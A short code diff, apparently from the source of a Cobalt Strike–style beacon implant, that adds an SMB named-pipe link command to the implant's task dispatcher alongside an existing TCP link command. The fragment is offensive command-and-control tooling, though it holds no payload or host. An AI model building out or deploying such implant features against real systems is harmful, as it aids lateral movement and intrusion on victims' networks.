@@ -3,6 +3,7 @@
 #include "beacon.h"
 #include "command.h"
 #include "filesystem.h"
+#include "link.h"
 #include "self.h"
 #include "spawn.h"
 
@@ -30,6 +31,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_TCP_CONNECT:
 			LinkViaTcp(buffer, size);
+			break;
+		case COMMAND_PIPE_OPEN_EXPLICIT:
+			ProtocolSmbOpenExplicit(buffer);
 			break;
 	}
 }
